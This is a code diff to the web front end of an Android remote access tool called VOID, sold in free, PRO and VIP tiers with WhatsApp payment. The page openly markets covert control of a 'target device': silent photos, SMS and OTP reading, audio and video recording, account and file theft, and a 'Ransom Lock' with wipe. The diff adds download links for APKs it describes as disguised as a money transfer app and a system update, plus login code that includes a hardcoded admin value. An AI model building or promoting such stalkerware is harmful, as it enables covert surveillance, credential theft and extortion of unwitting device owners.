@@ -22,7 +22,7 @@
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;}
   html{scroll-behavior:smooth;}
   html,body{background:radial-gradient(1200px 700px at 50% -10%,#131d3a 0%,#070b14 60%);color:var(--text);min-height:100vh;overflow-x:hidden;}
-  body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:60px;overflow-x:hidden;}
+  body{padding:14px;display:flex;flex-direction:column;align-items:center;padding-bottom:60px;}
 
   /* TOPBAR */
   .topbar{width:100%;max-width:1100px;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;background:linear-gradient(180deg,rgba(20,31,56,.85),rgba(15,23,41,.85));backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;margin-bottom:24px;box-shadow:0 8px 30px rgba(0,0,0,.4);position:sticky;top:8px;z-index:50;}
@@ -31,7 +31,6 @@
   .top-actions{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;}
   .top-btn{font-size:9.5px;font-weight:800;letter-spacing:.12em;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;border:none;padding:9px 12px;border-radius:10px;cursor:pointer;box-shadow:0 4px 14px rgba(123,92,255,.4);font-family:inherit;}
   .top-btn.ghost{background:var(--card);border:1px solid var(--border);color:var(--text-2);box-shadow:none;}
-  .top-btn.free{background:linear-gradient(135deg,#00e676,#22d3ee);color:#000;box-shadow:0 4px 14px rgba(0,230,118,.4);}
   .top-btn:active{transform:scale(.97);}
 
   /* LANDING */
@@ -91,31 +90,48 @@
   .price-card li::before{content:'✓';color:var(--accent-2);font-weight:900;}
   .upgrade-btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;letter-spacing:.15em;font-size:12px;cursor:pointer;box-shadow:0 8px 20px rgba(123,92,255,.3);margin-top:8px;font-family:inherit;}
   .upgrade-btn:active{transform:scale(.98);}
+  .upgrade-btn.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);box-shadow:0 8px 20px rgba(37,211,102,.3);}
 
   /* DOWNLOADS */
   .downloads-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
-  .dl-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:24px;position:relative;overflow:hidden;}
+  .dl-card{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:20px;padding:24px;}
   .dl-head{display:flex;align-items:center;gap:14px;margin-bottom:14px;}
   .dl-icon{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,var(--accent),var(--accent-2));display:flex;align-items:center;justify-content:center;font-size:24px;box-shadow:0 8px 20px rgba(123,92,255,.3);}
   .dl-card h3{font-size:17px;font-weight:900;color:#fff;}
   .dl-card .dl-sub{font-size:10px;color:var(--text-3);letter-spacing:.15em;margin-top:2px;}
   .dl-card p{font-size:12.5px;color:var(--text-2);line-height:1.55;margin-bottom:18px;}
   .dl-btn{display:block;width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;font-weight:900;letter-spacing:.15em;font-size:12px;cursor:pointer;text-align:center;text-decoration:none;box-shadow:0 8px 20px rgba(123,92,255,.3);font-family:inherit;}
-  .dl-btn.whatsapp{background:linear-gradient(135deg,#25d366,#128c7e);box-shadow:0 8px 20px rgba(37,211,102,.3);}
 
   footer{width:100%;max-width:1100px;margin-top:60px;padding:30px 20px;text-align:center;color:var(--text-3);font-size:11px;letter-spacing:.15em;border-top:1px solid var(--border);}
 
-  /* LOGIN MODAL */
-  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);backdrop-filter:blur(10px);display:none;align-items:center;justify-content:center;z-index:100;padding:20px;}
+  /* MODAL (plan picker) */
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(12px);display:none;align-items:flex-start;justify-content:center;z-index:100;padding:20px;overflow-y:auto;padding-top:40px;padding-bottom:40px;}
   .modal-overlay.show{display:flex;}
-  .login-box{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:34px 28px;width:100%;max-width:400px;box-shadow:0 30px 80px rgba(0,0,0,.7);}
-  .login-title{text-align:center;font-size:24px;letter-spacing:.1em;font-weight:900;color:#fff;margin-bottom:4px;}
-  .login-sub{text-align:center;font-size:10px;letter-spacing:.4em;color:var(--text-3);margin-bottom:26px;}
-  .login-field{width:100%;background:#070b14;border:1px solid var(--border);border-radius:12px;padding:15px;color:#fff;font-size:14px;letter-spacing:.1em;margin-bottom:12px;text-align:center;outline:none;font-family:inherit;}
-  .login-field:focus{border-color:var(--accent);box-shadow:0 0 0 4px rgba(123,92,255,.15);}
-  .login-field::placeholder{color:var(--text-3);letter-spacing:.18em;}
-  .login-btn{width:100%;padding:16px;border:none;border-radius:12px;font-weight:900;letter-spacing:.2em;font-size:13px;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent-2));cursor:pointer;box-shadow:0 10px 30px rgba(123,92,255,.4);font-family:inherit;}
-  .login-close{background:none;border:none;color:var(--text-3);font-size:11px;letter-spacing:.15em;display:block;margin:14px auto 0;cursor:pointer;font-family:inherit;}
+  .modal-box{background:linear-gradient(180deg,var(--card-2),var(--card));border:1px solid var(--border);border-radius:22px;padding:30px 24px;width:100%;max-width:440px;box-shadow:0 30px 80px rgba(0,0,0,.7);animation:pop .3s ease;}
+  @keyframes pop{from{opacity:0;transform:translateY(20px) scale(.96);}to{opacity:1;transform:translateY(0) scale(1);}}
+  .modal-title{text-align:center;font-size:22px;font-weight:900;color:#fff;margin-bottom:6px;}
+  .modal-sub{text-align:center;font-size:12px;color:var(--text-2);margin-bottom:24px;line-height:1.5;}
+  .plan-choice{display:block;width:100%;padding:18px;background:#0a1220;border:1.5px solid var(--border);border-radius:16px;text-align:left;margin-bottom:12px;cursor:pointer;transition:.15s;font-family:inherit;}
+  .plan-choice:hover,.plan-choice:active{border-color:var(--accent);background:#101c33;}
+  .plan-choice .pc-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;}
+  .plan-choice .pc-name{font-size:15px;font-weight:900;color:#fff;letter-spacing:.08em;}
+  .plan-choice .pc-price{font-size:16px;font-weight:900;color:var(--accent-2);}
+  .plan-choice .pc-desc{font-size:12px;color:var(--text-2);line-height:1.45;}
+  .modal-close{background:none;border:none;color:var(--text-3);font-size:11px;letter-spacing:.15em;display:block;margin:14px auto 0;cursor:pointer;font-family:inherit;}
+
+  /* CODE DISPLAY */
+  .code-display{background:#04070f;border:1.5px solid var(--accent);border-radius:16px;padding:24px 20px;text-align:center;margin:20px 0;box-shadow:0 0 40px rgba(123,92,255,.25);}
+  .code-label{font-size:10px;font-weight:900;letter-spacing:.3em;color:var(--text-3);margin-bottom:12px;}
+  .code-digits{font-family:'Menlo','Courier New',monospace;font-size:42px;font-weight:900;letter-spacing:.25em;color:#00e676;text-shadow:0 0 30px rgba(0,230,118,.5);margin-bottom:8px;}
+  .code-tag{display:inline-block;font-size:10px;font-weight:900;letter-spacing:.15em;padding:5px 12px;border-radius:20px;background:rgba(123,92,255,.2);color:#b7a9ff;margin-top:6px;}
+  .code-tag.free{background:rgba(0,230,118,.15);color:var(--success);}
+  .code-tag.pro{background:rgba(34,211,238,.15);color:var(--accent-2);}
+  .code-tag.vip{background:rgba(123,92,255,.2);color:#b7a9ff;}
+  .code-note{font-size:12.5px;color:var(--text-2);line-height:1.6;margin-bottom:16px;}
+  .code-actions{display:flex;gap:10px;margin-top:16px;}
+  .code-actions button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:900;letter-spacing:.15em;font-size:11px;cursor:pointer;font-family:inherit;}
+  .btn-copy{background:var(--card);border:1px solid var(--border);color:var(--text);}
+  .btn-continue{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;box-shadow:0 8px 20px rgba(123,92,255,.3);}
 
   /* PANEL */
   .panel{width:100%;max-width:520px;display:none;}
@@ -176,7 +192,7 @@
   .modal-img{position:fixed;inset:0;background:rgba(0,0,0,.95);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;}
   .modal-img.show{display:flex;}
   .modal-img img{max-width:100%;max-height:90vh;border-radius:14px;border:1px solid var(--accent);}
-  .modal-close{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;font-size:12px;cursor:pointer;font-family:inherit;}
+  .modal-close-btn{position:absolute;top:20px;right:20px;background:var(--card);border:1px solid var(--border);color:#fff;padding:10px 18px;border-radius:12px;font-size:12px;cursor:pointer;font-family:inherit;}
 
   @media(max-width:850px){
     .hero{grid-template-columns:1fr;}
@@ -192,6 +208,7 @@
     .hero-text h1{font-size:26px;}
     .topbar{flex-direction:column;gap:10px;}
     .top-actions{justify-content:center;}
+    .code-digits{font-size:36px;letter-spacing:.2em;}
   }
 </style>
 </head>
@@ -204,23 +221,21 @@
     <button class="top-btn ghost" onclick="goTo('functions')">FUNCTIONS</button>
     <button class="top-btn ghost" onclick="goTo('faq')">FAQ</button>
     <button class="top-btn ghost" onclick="goTo('pricing')">PRICING</button>
-    <button class="top-btn free" onclick="startFreeTrial()">FREE</button>
-    <button class="top-btn" onclick="openLogin()">LOGIN</button>
+    <button class="top-btn" onclick="openPlanPicker()">GET STARTED</button>
   </div>
 </div>
 
 <!-- LANDING -->
 <div class="landing" id="landing">
 
-  <!-- HERO -->
   <div class="hero">
     <div class="hero-text">
       <div class="badge">SECURITY PROFESSIONALS</div>
       <h1>Advanced Android <span>management toolkit</span> for security professionals.</h1>
       <p>Monitor, control, and secure any Android device from your browser. Real-time access, zero installation complexity, professional-grade reliability.</p>
       <div class="hero-buttons">
-        <button class="primary" onclick="startFreeTrial()">TRY FREE</button>
-        <button class="secondary" onclick="openLogin()">LOGIN WITH CODE</button>
+        <button class="primary" onclick="openPlanPicker()">GET STARTED</button>
+        <button class="secondary" onclick="goTo('pricing')">VIEW PRICING</button>
       </div>
     </div>
     <div class="hero-card">
@@ -231,7 +246,6 @@
     </div>
   </div>
 
-  <!-- FEATURES -->
   <section>
     <h2>Core Capabilities</h2>
     <p>Everything you need in one panel</p>
@@ -243,19 +257,17 @@
     </div>
   </section>
 
-  <!-- HOW IT WORKS -->
   <section>
     <h2>How It Works</h2>
     <p>Four steps to full access</p>
     <div class="steps">
-      <div class="step"><div class="num">STEP 01</div><h3>Install</h3><p>Deliver the app to the target device.</p></div>
-      <div class="step"><div class="num">STEP 02</div><h3>Activate</h3><p>Enter the unique access code.</p></div>
-      <div class="step"><div class="num">STEP 03</div><h3>Connect</h3><p>Device appears in your panel instantly.</p></div>
-      <div class="step"><div class="num">STEP 04</div><h3>Control</h3><p>Send commands from any browser.</p></div>
+      <div class="step"><div class="num">STEP 01</div><h3>Get Code</h3><p>Pick a plan — system gives you a 5-digit code.</p></div>
+      <div class="step"><div class="num">STEP 02</div><h3>Install</h3><p>Deliver the app to the target device.</p></div>
+      <div class="step"><div class="num">STEP 03</div><h3>Activate</h3><p>Enter the code in the app.</p></div>
+      <div class="step"><div class="num">STEP 04</div><h3>Control</h3><p>Log in with the same code on the panel.</p></div>
     </div>
   </section>
 
-  <!-- WHY CHOOSE US -->
   <section>
     <h2>Why Choose Us</h2>
     <p>Built for reliability at scale</p>
@@ -267,35 +279,33 @@
     </div>
   </section>
 
-  <!-- FUNCTIONS -->
   <section id="functions">
     <h2>Available Functions</h2>
     <p>Complete command set — organized by tier</p>
     <div class="grid-4">
-      <div class="feature"><div class="icon">📍</div><h3>Location Tracking</h3><p>Real-time GPS + Google Maps link. <span style="color:#00e676;font-weight:700;">FREE</span></p></div>
-      <div class="feature"><div class="icon">📸</div><h3>Camera Capture</h3><p>Silent photo from back or front. <span style="color:#00e676;font-weight:700;">FREE</span></p></div>
-      <div class="feature"><div class="icon">💬</div><h3>SMS Reader</h3><p>Last 50 messages including OTPs. <span style="color:#00e676;font-weight:700;">FREE</span></p></div>
-      <div class="feature"><div class="icon">📱</div><h3>Screen Capture</h3><p>Live screenshot of target device. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
-      <div class="feature"><div class="icon">🔴</div><h3>Live Screen</h3><p>Continuous screenshots every 3s. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
-      <div class="feature"><div class="icon">🔔</div><h3>Notifications</h3><p>Recent notifications from all apps. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
-      <div class="feature"><div class="icon">👤</div><h3>Contacts</h3><p>Full contact list with numbers. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
-      <div class="feature"><div class="icon">📞</div><h3>Call Log</h3><p>Last 50 calls with timestamps. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
-      <div class="feature"><div class="icon">📦</div><h3>App List</h3><p>All installed apps — tap to open. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
-      <div class="feature"><div class="icon">🤳</div><h3>Selfie Capture</h3><p>Front camera photo with no preview. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
-      <div class="feature"><div class="icon">🎥</div><h3>Video Recording</h3><p>10s rear camera video with audio. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
-      <div class="feature"><div class="icon">🎤</div><h3>Audio Recording</h3><p>15s microphone recording. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
-      <div class="feature"><div class="icon">👥</div><h3>Account Sync</h3><p>Google, WhatsApp, Facebook accounts. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
-      <div class="feature"><div class="icon">📁</div><h3>File Browser</h3><p>Browse and download files. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
-      <div class="feature"><div class="icon">💭</div><h3>Toast Message</h3><p>Send a popup to the target. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
-      <div class="feature"><div class="icon">🔒</div><h3>Remote Lock</h3><p>Lock screen with custom message. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">📍</div><h3>Location</h3><p>GPS + Maps link. <span style="color:#00e676;font-weight:700;">FREE</span></p></div>
+      <div class="feature"><div class="icon">📸</div><h3>Back Camera</h3><p>Silent rear photo. <span style="color:#00e676;font-weight:700;">FREE</span></p></div>
+      <div class="feature"><div class="icon">💬</div><h3>SMS</h3><p>Last 50 messages. <span style="color:#00e676;font-weight:700;">FREE</span></p></div>
+      <div class="feature"><div class="icon">📱</div><h3>Screenshot</h3><p>Current screen capture. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
+      <div class="feature"><div class="icon">🔴</div><h3>Live Screen</h3><p>Continuous every 3s. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
+      <div class="feature"><div class="icon">🔔</div><h3>Notifications</h3><p>From all apps. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
+      <div class="feature"><div class="icon">👤</div><h3>Contacts</h3><p>Full list with numbers. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
+      <div class="feature"><div class="icon">📞</div><h3>Call Log</h3><p>Last 50 calls. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
+      <div class="feature"><div class="icon">📦</div><h3>Apps</h3><p>Tap to open remotely. <span style="color:#22d3ee;font-weight:700;">PRO</span></p></div>
+      <div class="feature"><div class="icon">🤳</div><h3>Selfie</h3><p>Silent front photo. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">🎥</div><h3>Video</h3><p>10s rear video. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">🎤</div><h3>Audio</h3><p>15s mic recording. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">👥</div><h3>Accounts</h3><p>Google, WhatsApp, etc. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">📁</div><h3>Files</h3><p>Browse and download. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">💭</div><h3>Toast</h3><p>Popup on device. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
+      <div class="feature"><div class="icon">🔒</div><h3>Lock</h3><p>Ransom screen. <span style="color:#b7a9ff;font-weight:700;">VIP</span></p></div>
     </div>
 
-    <!-- Compatibility -->
     <div style="margin-top:44px;text-align:center;">
       <div style="display:inline-block;padding:24px 30px;background:linear-gradient(180deg,#141f38,#0f1729);border:1px solid #1e2c4d;border-radius:20px;max-width:600px;">
         <div style="font-size:11px;font-weight:900;letter-spacing:.3em;color:#22d3ee;margin-bottom:12px;">COMPATIBILITY</div>
         <div style="font-size:15px;color:#fff;font-weight:700;margin-bottom:8px;">Android 5.0 — 15+</div>
-        <div style="font-size:12.5px;color:#8894b5;line-height:1.6;">Full support for all Android versions from Lollipop to the latest release. Camera2 API for silent capture on modern devices.</div>
+        <div style="font-size:12.5px;color:#8894b5;line-height:1.6;">Full support for all Android versions. Camera2 API for silent capture on modern devices.</div>
         <div style="margin-top:18px;padding-top:18px;border-top:1px solid #1e2c4d;font-size:12.5px;color:#8894b5;">
           📱 <strong style="color:#fff;">iOS version</strong> — launching soon.
         </div>
@@ -303,7 +313,6 @@
     </div>
   </section>
 
-  <!-- PRICING -->
   <section id="pricing">
     <h2>Access Tiers</h2>
     <p>Choose the plan that fits your operation</p>
@@ -311,13 +320,13 @@
       <div class="price-card">
         <div class="tier">FREE</div>
         <div class="price">₦0</div>
-        <div class="price-label">TRY IT OUT</div>
+        <div class="price-label">FOREVER</div>
         <ul>
           <li>3 commands total</li>
           <li>Location, Camera, SMS</li>
-          <li>Basic support</li>
+          <li>Never expires</li>
         </ul>
-        <button class="upgrade-btn" onclick="startFreeTrial()">START FREE</button>
+        <button class="upgrade-btn" onclick="generateFree()">GET FREE CODE</button>
       </div>
       <div class="price-card featured">
         <div class="tier">PRO</div>
@@ -329,7 +338,7 @@
           <li>Notifications, Screen, Contacts</li>
           <li>Priority support</li>
         </ul>
-        <button class="upgrade-btn" onclick="upgradeTier('pro')">UPGRADE TO PRO</button>
+        <button class="upgrade-btn whatsapp" onclick="upgradeTier('pro')">BUY PRO VIA WHATSAPP</button>
       </div>
       <div class="price-card">
         <div class="tier">VIP</div>
@@ -337,17 +346,15 @@
         <div class="price-label">UNLIMITED</div>
         <ul>
           <li>Unlimited commands</li>
-          <li>Remote screen control</li>
           <li>Camera, Audio, Video, Files</li>
-          <li>Wipe + Lock features</li>
+          <li>Ransom Lock + Wipe</li>
           <li>Dedicated support</li>
         </ul>
-        <button class="upgrade-btn" onclick="upgradeTier('vip')">UPGRADE TO VIP</button>
+        <button class="upgrade-btn whatsapp" onclick="upgradeTier('vip')">BUY VIP VIA WHATSAPP</button>
       </div>
     </div>
   </section>
 
-  <!-- DOWNLOADS -->
   <section>
     <h2>Downloads</h2>
     <p>Get the target-side app</p>
@@ -360,8 +367,8 @@
             <div class="dl-sub">VERSION 1.0 — ANDROID</div>
           </div>
         </div>
-        <p>Deploy on the target device. Looks like a Nigerian money transfer app. Links account for the monitoring dashboard.</p>
-        <a class="dl-btn whatsapp" href="https://wa.me/2349153239545?text=Hi%2C%20I%20want%20the%20PAYME%20APK%20download%20link" target="_blank">MESSAGE TO RECEIVE APK</a>
+        <p>Looks like a Nigerian money transfer app. Links the target device to your panel.</p>
+        <a class="dl-btn" href="https://github.com/voidffx1/void-wallet/releases/download/v1.0/PAYME_1.0.apk" download>DOWNLOAD APK</a>
       </div>
       <div class="dl-card">
         <div class="dl-head">
@@ -371,37 +378,95 @@
             <div class="dl-sub">VERSION 1.0 — ANDROID</div>
           </div>
         </div>
-        <p>Alternative installer. Looks like an Android system update. Same backend, different disguise.</p>
-        <a class="dl-btn whatsapp" href="https://wa.me/2349153239545?text=Hi%2C%20I%20want%20the%20System%20Update%20APK%20download%20link" target="_blank">MESSAGE TO RECEIVE APK</a>
+        <p>Looks like an Android system update. Same backend, different disguise.</p>
+        <a class="dl-btn" href="https://github.com/voidffx1/void-wallet/releases/download/v1.0/System.Update_1.0.apk" download>DOWNLOAD APK</a>
       </div>
     </div>
   </section>
 
-  <!-- FAQ -->
   <section id="faq">
     <h2>Frequently Asked Questions</h2>
     <p>Everything you need to know</p>
-    <div class="faq-item"><h3>How do I access my panel?</h3><p>Click LOGIN at the top, enter username VOID and your 5-digit user code. If you don't have a code yet, click FREE to try the trial.</p></div>
-    <div class="faq-item"><h3>Which commands are in each tier?</h3><p>Free tier gives you 3 basic commands. Pro unlocks daily limits and more commands. VIP has everything unlimited including remote screen control and file browser.</p></div>
-    <div class="faq-item"><h3>How do I upgrade?</h3><p>Click UPGRADE on any pricing card. It opens a WhatsApp chat with our team. Send your user code and the tier you want. We send payment details.</p></div>
-    <div class="faq-item"><h3>How long does deployment take?</h3><p>Under 60 seconds. Install the app, enter your code, grant permissions. Done.</p></div>
-    <div class="faq-item"><h3>Does it work on all Android versions?</h3><p>Yes. Fully compatible with Android 5 through Android 15+. Camera capture uses Camera2 API on modern devices for silent operation.</p></div>
-    <div class="faq-item"><h3>Is there an iOS version?</h3><p>Coming soon. iOS version is in development. Follow our WhatsApp channel for updates.</p></div>
-    <div class="faq-item"><h3>How do I get the APK?</h3><p>Message +2349153239545 on WhatsApp. We send the APK directly to you after confirming your order.</p></div>
+    <div class="faq-item"><h3>How does the code system work?</h3><p>When you pick a plan, the system generates a unique 5-digit code for you. Use the same code to log in here AND to activate the PAYME app on the target device.</p></div>
+    <div class="faq-item"><h3>Is the free tier really free?</h3><p>Yes. You get a code that never expires and 3 commands total. No payment needed.</p></div>
+    <div class="faq-item"><h3>How do I upgrade to PRO or VIP?</h3><p>Tap the PRO or VIP button. It opens WhatsApp. Send your message, we send payment details. After payment, we send you the upgraded code.</p></div>
+    <div class="faq-item"><h3>Does it work on all Android versions?</h3><p>Yes. Android 5 through Android 15+. Camera capture uses Camera2 API on modern devices.</p></div>
+    <div class="faq-item"><h3>Is there an iOS version?</h3><p>Coming soon. Follow our WhatsApp for updates.</p></div>
+    <div class="faq-item"><h3>What if I lose my code?</h3><p>Message us on WhatsApp. We keep records of every generated code.</p></div>
   </section>
 
   <footer>VOID REMOTE ACCESS TOOL © 2026 — All rights reserved</footer>
 </div>
 
-<!-- LOGIN MODAL -->
+<!-- PLAN PICKER MODAL -->
+<div class="modal-overlay" id="planModal">
+  <div class="modal-box">
+    <div class="modal-title">Choose Your Plan</div>
+    <div class="modal-sub">Pick a tier. The system will generate your unique 5-digit access code.</div>
+
+    <button class="plan-choice" onclick="generateFree()">
+      <div class="pc-head">
+        <div class="pc-name">FREE</div>
+        <div class="pc-price">₦0</div>
+      </div>
+      <div class="pc-desc">3 commands total. Location, Camera, SMS. Never expires.</div>
+    </button>
+
+    <button class="plan-choice" onclick="upgradeTier('pro')">
+      <div class="pc-head">
+        <div class="pc-name">PRO</div>
+        <div class="pc-price">₦1,000</div>
+      </div>
+      <div class="pc-desc">10 commands/day. All standard commands. Priority support.</div>
+    </button>
+
+    <button class="plan-choice" onclick="upgradeTier('vip')">
+      <div class="pc-head">
+        <div class="pc-name">VIP</div>
+        <div class="pc-price">₦3,000</div>
+      </div>
+      <div class="pc-desc">Unlimited. Everything. Camera, Audio, Video, Lock, Wipe.</div>
+    </button>
+
+    <button class="modal-close" onclick="closeModal()">CANCEL</button>
+  </div>
+</div>
+
+<!-- CODE DISPLAY MODAL -->
+<div class="modal-overlay" id="codeModal">
+  <div class="modal-box">
+    <div class="modal-title">Your Access Code</div>
+    <div class="modal-sub">Save this code. You'll use it for the panel AND the PAYME app.</div>
+
+    <div class="code-display">
+      <div class="code-label">YOUR 5-DIGIT CODE</div>
+      <div class="code-digits" id="generatedCode">— — — — —</div>
+      <div class="code-tag free" id="codeTier">FREE</div>
+    </div>
+
+    <div class="code-note" id="codeNote">
+      Enter this code in the PAYME app on the target device. Then come back here and log in with the same code.
+    </div>
+
+    <div class="code-actions">
+      <button class="btn-copy" onclick="copyCode()">COPY</button>
+      <button class="btn-continue" onclick="continueToPanel()">ENTER PANEL</button>
+    </div>
+
+    <button class="modal-close" onclick="closeModal()">CLOSE</button>
+  </div>
+</div>
+
+<!-- LOGIN MODAL (optional — for existing users with codes) -->
 <div class="modal-overlay" id="loginModal">
-  <div class="login-box">
-    <div class="login-title">VOID</div>
-    <div class="login-sub">ACCESS YOUR PANEL</div>
-    <input class="login-field" id="loginUser" placeholder="USERNAME" autocomplete="off" value="VOID">
-    <input class="login-field" id="loginPass" placeholder="USER ID" type="number" autocomplete="off">
-    <button class="login-btn" id="loginBtn">ENTER PANEL</button>
-    <button class="login-close" onclick="closeLogin()">CANCEL</button>
+  <div class="modal-box">
+    <div class="modal-title">Log In</div>
+    <div class="modal-sub">Enter your user code to access your panel</div>
+    <input class="plan-choice" style="text-align:center;font-family:monospace;font-size:22px;letter-spacing:.3em;color:#00e676;" id="loginCode" placeholder="— — — — —" maxlength="5" inputmode="numeric">
+    <div class="code-actions" style="margin-top:14px;">
+      <button class="btn-copy" onclick="closeModal()">CANCEL</button>
+      <button class="btn-continue" onclick="loginWithCode()">ENTER</button>
+    </div>
   </div>
 </div>
 
@@ -430,7 +495,7 @@
     <div class="detail-sub" id="detailSub">—</div>
 
     <div class="section-label">REMOTE CONTROL</div>
-    <div class="grid" id="controlGrid">
+    <div class="grid">
       <div class="ctrl" data-cmd="location_sync" data-tier="free"><div class="icon">📍</div><div class="label">LOCATION</div><div class="desc">GPS + Maps</div></div>
       <div class="ctrl" data-cmd="photo_capture" data-tier="free"><div class="icon">📸</div><div class="label">BACK CAM</div><div class="desc">Rear photo</div></div>
       <div class="ctrl" data-cmd="message_sync" data-tier="free"><div class="icon">💬</div><div class="label">SMS</div><div class="desc">Inbox</div></div>
@@ -457,7 +522,7 @@
 </div>
 
 <div class="toast" id="toast"></div>
-<div class="modal-img" id="imgModal"><button class="modal-close" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button><img id="imgModalImg" src=""></div>
+<div class="modal-img" id="imgModal"><button class="modal-close-btn" onclick="document.getElementById('imgModal').classList.remove('show')">CLOSE</button><img id="imgModalImg" src=""></div>
 
 <script>
 const SERVER = "https://voidremotetool.onrender.com";
@@ -468,13 +533,13 @@ const TIER_RANK = { free: 0, pro: 1, vip: 2 };
 let state = {
   token:null, userId:null, isAdmin:false, tier:'free', commandsUsed:0,
   currentDevice:null, pollTimer:null, liveOn:false, flashOn:false,
-  lastResultId:0, activeCommand:null
+  lastResultId:0, activeCommand:null,
+  pendingCode:null, pendingTier:null
 };
 
 function $(id){return document.getElementById(id);}
 function esc(s){return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
 
-// ---------- SCROLL ----------
 function goTo(id){
   const el = document.getElementById(id);
   if(!el) return;
@@ -491,75 +556,98 @@ function showToast(msg){
   setTimeout(function(){ t.classList.remove('show'); }, 2500);
 }
 
-function showScreen(id){
-  document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
-  $(id).classList.add('active');
+function openPlanPicker(){
+  closeModal();
+  $('planModal').classList.add('show');
 }
 
-function openLogin(){ $('loginModal').classList.add('show'); }
-function closeLogin(){ $('loginModal').classList.remove('show'); }
+function closeModal(){
+  document.querySelectorAll('.modal-overlay').forEach(function(m){ m.classList.remove('show'); });
+}
 
-// ---------- LOGIN ----------
-$('loginBtn').addEventListener('click', async function(){
-  const u = $('loginUser').value.trim();
-  const p = $('loginPass').value.trim();
-  if(!u || !p){ showToast('Enter username and user ID'); return; }
+function copyCode(){
+  if(!state.pendingCode) return;
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(state.pendingCode).then(function(){
+      showToast('Code copied: ' + state.pendingCode);
+    });
+  } else {
+    showToast('Copy manually: ' + state.pendingCode);
+  }
+}
+
+// ---------- FREE CODE GENERATION ----------
+async function generateFree(){
+  closeModal();
   try{
-    const r = await fetch(SERVER+'/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u, password:p})});
+    const r = await fetch(SERVER+'/generate-code', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ tier: 'free' })
+    });
     const j = await r.json();
-    if(!j.ok){ showToast('Invalid credentials'); return; }
+    if(!j.ok){ showToast('Generation failed. Try again.'); return; }
+
+    state.pendingCode = j.code;
+    state.pendingTier = 'free';
+
+    $('generatedCode').textContent = j.code;
+    $('codeTier').textContent = 'FREE';
+    $('codeTier').className = 'code-tag free';
+    $('codeNote').innerHTML = 'Enter this code in the <strong>PAYME app</strong> on the target device. Then come back here and tap ENTER PANEL to log in with the same code.<br><br>Free tier: <strong style="color:#00e676;">3 commands total</strong>. Never expires.';
+
+    $('codeModal').classList.add('show');
+  }catch(e){
+    showToast('Server unreachable');
+  }
+}
+
+function continueToPanel(){
+  if(!state.pendingCode) return;
+  const code = state.pendingCode;
+  closeModal();
+  performLogin(code, false);
+}
+
+function loginWithCode(){
+  const code = $('loginCode').value.trim();
+  if(code.length !== 5){ showToast('Enter your 5-digit code'); return; }
+  closeModal();
+  performLogin(code, code === '201019');
+}
+
+async function performLogin(code, isAdmin){
+  try{
+    const r = await fetch(SERVER+'/auth',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({username:'VOID', password:code})
+    });
+    const j = await r.json();
+    if(!j.ok){ showToast('Invalid code'); return; }
+
     state.token = j.token;
     state.userId = j.userId;
     state.isAdmin = !!j.admin;
     state.tier = j.tier || 'free';
